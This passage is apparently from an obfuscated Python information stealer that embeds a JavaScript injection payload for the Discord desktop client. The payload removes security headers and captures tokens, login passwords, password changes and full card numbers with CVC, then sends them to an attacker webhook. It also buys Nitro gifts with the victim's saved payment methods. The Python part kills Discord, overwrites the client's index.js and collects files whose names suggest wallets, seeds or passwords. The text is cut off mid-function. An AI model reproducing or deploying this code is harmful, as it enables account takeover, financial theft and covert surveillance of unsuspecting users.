
  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def BKDIZQNMFUDTKLFMEXJGRAZURJLIZZZPEOLTYEGGPFMURVIFTRQAQVKXXTRHHXLGNFYEDIWISXYKGASNSU():
    import os
    import re
    import subprocess
    import psutil

    YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM = "Active"

    def CBNPNSLXLTJJQGAAYINMXVGTFQCEUKBCDBSAHATYEKICRSXNWUAER(KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE):
        for v4r_file in os.listdir(KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE):
            if re.search(r'app-+?', v4r_file):
                UQCGHWVIYJAETQOELFUNLNHQGZBOMBWMCRQPRFHRLJEIGDUGKQWXLMJRQQEHYCVLVXQW = KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE + '\\' + v4r_file + '\\modules'
                if not os.path.exists(UQCGHWVIYJAETQOELFUNLNHQGZBOMBWMCRQPRFHRLJEIGDUGKQWXLMJRQQEHYCVLVXQW):
                    continue
                for v4r_file in os.listdir(UQCGHWVIYJAETQOELFUNLNHQGZBOMBWMCRQPRFHRLJEIGDUGKQWXLMJRQQEHYCVLVXQW):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ = UQCGHWVIYJAETQOELFUNLNHQGZBOMBWMCRQPRFHRLJEIGDUGKQWXLMJRQQEHYCVLVXQW + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ, v4r_file
        return None

    def ZONWNDYOLDNMUVAYMUNEZEQGSPILZQHBFHGKBRAYQDPBMAHYSYLBPAARJKBYCMDSUME(KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE):
        AYNKNKZIIIVLPABMNUUJTOJYCPMOAJAQWTERLJIGWZQOOKQEDSALLFMDXOVTYTOZSMIWXHYFUPJMCGEJQECYQXX = KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE + '\\Update.exe'
        NYRTZMKFDUEETTQQJYAWNVUAPTTEVZAPTKUBWTDTGPMOKLBKXZCIOZOO = KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE):
            if re.search(r'app-+?', v4r_file):
                WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNN = KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE + '\\' + v4r_file
                if os.path.exists(WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNN + '\\' + 'modules'):
                    for v4r_file in os.listdir(WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNN):
                        if v4r_file == NYRTZMKFDUEETTQQJYAWNVUAPTTEVZAPTKUBWTDTGPMOKLBKXZCIOZOO:
                            NYRTZMKFDUEETTQQJYAWNVUAPTTEVZAPTKUBWTDTGPMOKLBKXZCIOZOO = WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNN + '\\' + NYRTZMKFDUEETTQQJYAWNVUAPTTEVZAPTKUBWTDTGPMOKLBKXZCIOZOO
                            subprocess.call([AYNKNKZIIIVLPABMNUUJTOJYCPMOAJAQWTERLJIGWZQOOKQEDSALLFMDXOVTYTOZSMIWXHYFUPJMCGEJQECYQXX, '--processStart', NYRTZMKFDUEETTQQJYAWNVUAPTTEVZAPTKUBWTDTGPMOKLBKXZCIOZOO],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def SYWWOORWJQCGNMAEFUJUEBQYQLRTVTMATDKUYOHKVVVRMTBDDAVQFDSLCGVCFDRFJ():
        WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNNdata = os.getenv('LOCALAPPDATA')
        ZWWPETEKVTFLJUIWHZAGUWPCMEAODCBSDKTUNEUSKKJIWOEYBFMKJVJSEWABSDLTWCEKXSXIEQMD = [
            WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNNdata + '\\Discord',
            WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNNdata + '\\DiscordCanary',
            WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNNdata + '\\DiscordPTB',
            WERDAVERRARSVBYNHFTWEUFREXZFJHTZSJKSILDMDGACKFNCUFNNdata + '\\DiscordDevelopment'
        ]
        ESPXQUWWUZKTKLRBEJCFSJKJBFDZZWHUZDJHIUZITGMCBEUYOCUIKZQXKNUCXXUAEJCOLBOVQUPXXPMUDBIOPCQPUQLPHGMV = SPVMQGOTSLUVRZMMIFHXOIBTNYNPZYGVYJJLYMQSRTEQSUZMKKLNIMITUWMZOXUYMCWOSMHDCZJGBEEGMJUJLOKAOQWBAOB

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE in ZWWPETEKVTFLJUIWHZAGUWPCMEAODCBSDKTUNEUSKKJIWOEYBFMKJVJSEWABSDLTWCEKXSXIEQMD:
            if not os.path.exists(KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE):
                continue

            PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ_info = CBNPNSLXLTJJQGAAYINMXVGTFQCEUKBCDBSAHATYEKICRSXNWUAER(KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE)
            if PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ_info is not None:
                PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ, PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ_file = PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ_info
                
                VZWHZOOVEMXNDHBOXRGCHSBHBVLJVUXNQCJVNLMOEYEZIRPVAGFFFYSJNEXBOARAECAGTIQFNRFRDVYFFTSABUWUAQMCEYUYI = PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ + '\\index.js'
                
                if not os.path.exists(VZWHZOOVEMXNDHBOXRGCHSBHBVLJVUXNQCJVNLMOEYEZIRPVAGFFFYSJNEXBOARAECAGTIQFNRFRDVYFFTSABUWUAQMCEYUYI):
                    open(VZWHZOOVEMXNDHBOXRGCHSBHBVLJVUXNQCJVNLMOEYEZIRPVAGFFFYSJNEXBOARAECAGTIQFNRFRDVYFFTSABUWUAQMCEYUYI, 'w').close()

                with open(VZWHZOOVEMXNDHBOXRGCHSBHBVLJVUXNQCJVNLMOEYEZIRPVAGFFFYSJNEXBOARAECAGTIQFNRFRDVYFFTSABUWUAQMCEYUYI, 'w', encoding='utf-8') as f:
                    f.write((ESPXQUWWUZKTKLRBEJCFSJKJBFDZZWHUZDJHIUZITGMCBEUYOCUIKZQXKNUCXXUAEJCOLBOVQUPXXPMUDBIOPCQPUQLPHGMV).replace('discord_desktop_core-1', PXXKWVEEAHBAZDAOVBZUFXYOCMXXXNOBQXPJDMUYPVDGFGBBXSQJPOKVGBRJAOXHWMNJ_file)
                            .replace(r"%WEBHOOK_HERE%", JOCMFRVMGIQTXZFFAFAZXHWFLFQEYTNKZLGXZKIKEOIICLYLLQTFBSLLDSIJFXYRBQLHUYGXMSCBCKDISBVA)
                            .replace(r"%EMBED_COLOR%", str(FSEQNBXZZBZQDXIQBWQPLZRLMTAILBWAXBLZWCNRRMCGZDTLOHZWGBAMRQHDKIWRPWITBFJYKMRGXKQUCGZSVAVSNKXDP))
                            .replace(r"%USERNAME%", HWQZSVDFSIMSQBVEEPJSHAGWWTAVYRKQYHEODTUOURJDPQFBMOOVDF)
                            .replace(r"%IP_PUBLIC%", KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK)
                            .replace(r"%EMBED_NAME%", OCOKZAPOAWILFUIAMUHJOXCZOTPCCZXCIRJWXDQSTUTDJLJBFFY)
                            .replace(r"%EMBED_ICON%", OSHPIUHGICAPWGMBRGEHNGFPLIZJRALNHIICANVIKADVLAELZAAIDEBNMJPMLOMNGIGDAHU)
                            .replace(r"%FOOTER_TEXT%", SIWVHBFTDLLWWJGZQYCHKQQYCXFHKQFRMTNZOOLELRVVVLOOINAJQMPYOZZEFBEXHTVXNORXWNJWFXNZXHIVSBFLAAMMG)
                            .replace(r"%WEBSITE%", XIEHNMMYBCRFABUCYICFZTFLSLEARCFZVIPOGWLLNUEWYGLCUZMIKXQFSKANEVWOBEHLHLQBOBWCKA))
                ZONWNDYOLDNMUVAYMUNEZEQGSPILZQHBFHGKBRAYQDPBMAHYSYLBPAARJKBYCMDSUME(KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYE)
                
    SYWWOORWJQCGNMAEFUJUEBQYQLRTVTMATDKUYOHKVVVRMTBDDAVQFDSLCGVCFDRFJ()
    return YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM

def VZMHHXVVNLBKYGFPBTZHUNTNETZBHIPKCSQEELNFBOGIUVWIBSMTLFUFCYUNXFBJNSFDWZLEZLZNYQHEILTOAWUTY(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    import os
    import random

    YIKOETNTWCMWZZJQKOXTXPJHWTCRHAGODFHDXYDZGBSUXJACOTQSTAFTUJZXGUHCBTFXPPXJFYO = [
        os.path.join(KEJSJBTLKTYHJEIZYMRLCYQENWAZQONBBLMFNOYEOOIRGQNYEJUBFRE, "Desktop"),
        os.path.join(KEJSJBTLKTYHJEIZYMRLCYQENWAZQONBBLMFNOYEOOIRGQNYEJUBFRE, "Downloads"),
        os.path.join(KEJSJBTLKTYHJEIZYMRLCYQENWAZQONBBLMFNOYEOOIRGQNYEJUBFRE, "Documents"),
        os.path.join(KEJSJBTLKTYHJEIZYMRLCYQENWAZQONBBLMFNOYEOOIRGQNYEJUBFRE, "Picture"),
        os.path.join(KEJSJBTLKTYHJEIZYMRLCYQENWAZQONBBLMFNOYEOOIRGQNYEJUBFRE, "Video"),
        os.path.join(KEJSJBTLKTYHJEIZYMRLCYQENWAZQONBBLMFNOYEOOIRGQNYEJUBFRE, "OneDrive"),
        os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Microsoft", "Windows", "Recent")
    ]

    OZFCBGIQVKXDQIOLTWBCYPFKKNNDDHJFXAASKQZDYQTEEMPARVEWMEOTNENRRCYHGSCXPIIHETDLAPXLVPwords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW_files = []

    for ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG in YIKOETNTWCMWZZJQKOXTXPJHWTCRHAGODFHDXYDZGBSUXJACOTQSTAFTUJZXGUHCBTFXPPXJFYO:
        for v4r_root, KZGRFGAUZMTVZFOZRHGWZSFCMLKZPOGHWYGZWJWJFSKUBDXXMXJGQAABYEs, v4r_files in os.walk(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        BKYSKIGVFLLTLSYGILWEGAZQEPQGNKXFRCHNUJXSVMTVHNTIKXTQJTJNVYTUNQRETCLWGUZKWRCRXSCNHQJJ = os.path.splitext(v4r_file)[0].lower()
                        for OZFCBGIQVKXDQIOLTWBCYPFKKNNDDHJFXAASKQZDYQTEEMPARVEWMEOTNENRRCYHGSCXPIIHETDLAPXLVPword in OZFCBGIQVKXDQIOLTWBCYPFKKNNDDHJFXAASKQZDYQTEEMPARVEWMEOTNENRRCYHGSCXPIIHETDLAPXLVPwords:
                            try:
                                if OZFCBGIQVKXDQIOLTWBCYPFKKNNDDHJFXAASKQZDYQTEEMPARVEWMEOTNENRRCYHGSCXPIIHETDLAPXLVPword.lower() == BKYSKIGVFLLTLSYGILWEGAZQEPQGNKXFRCHNUJXSVMTVHNTIKXTQJTJNVYTUNQRETCLWGUZKWRCRXSCNHQJJ:
                                    VTRKPMBYWXGTFYMTIFUDANJWNZWYITXWYTHIRZBXHGVTVTJKZQIWFXHPKYWVIPGBFNPMUYFZNVPLSFBLLIBROZPEWPDKO = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(VTRKPMBYWXGTFYMTIFUDANJWNZWYITXWYTHIRZBXHGVTVTJKZQIWFXHPKYWVIPGBFNPMUYFZNVPLSFBLLIBROZPEWPDKO):
                                        HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW_files.append(v4r_file)
                                        v4r_base_name, v4r_ext = os.path.splitext(v4r_file)
                                        with open(VTRKPMBYWXGTFYMTIFUDANJWNZWYITXWYTHIRZBXHGVTVTJKZQIWFXHPKYWVIPGBFNPMUYFZNVPLSFBLLIBROZPEWPDKO, "rb") as v4r_f:
                                            FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + v4r_ext), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW_files:
